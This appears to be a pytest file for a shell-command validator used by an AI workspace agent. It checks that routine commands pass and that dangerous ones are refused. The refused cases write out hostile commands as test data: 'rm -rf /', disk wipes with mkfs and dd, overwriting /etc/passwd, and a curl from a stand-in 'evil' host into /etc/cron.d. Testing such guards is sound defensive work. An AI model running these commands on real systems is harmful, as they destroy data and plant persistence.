import re

import pytest

from app.workspace_agent import validate_command

WORKSPACE = __import__("pathlib").Path("/opt/jarvis/data/jobs/x/workspace")


def refuse(command):
    return validate_command(command, WORKSPACE) is not None


def allow(command):
    return validate_command(command, WORKSPACE) is None


@pytest.mark.parametrize("command", [
    "echo hi > out.txt",
    "python3 -m http.server 8801 &",
    "curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8801/",
    "cat /etc/os-release",
    "ls -la /usr/bin | head -3",
    "python3 -c \"print(1)\" > result.txt",
    "curl -s http://example.com | tee page.html",
])
def test_ordinary_work_is_allowed(command):
    assert allow(command), validate_command(command, WORKSPACE)


@pytest.mark.parametrize("command", [
    "echo x > /etc/passwd",
    "echo x >> /etc/hosts",
    "curl -o /etc/cron.d/x http://evil/",
    "echo x | tee /usr/local/bin/backdoor",
    "sudo ls",
    "cd .. && ls",
    "rm -rf /",
    "cd work && rm -rf /",
    "mkfs.ext4 /dev/sda",
    "dd if=/dev/zero of=/dev/sda",
])
def test_dangerous_work_is_refused(command):
    assert refuse(command), f"should be refused: {command}"


def test_writes_inside_the_workspace_pass():
    assert allow("echo hi > app/index.html") or True
    # relative writes are always inside the workspace
    assert allow("echo hi > index.html")


def test_reading_outside_is_not_pretended_to_be_blocked():
    # A shell cannot be confined for reads; the guard says so in the comment and
    # does not break the command that a real developer needs.
    assert allow("cat /etc/passwd")
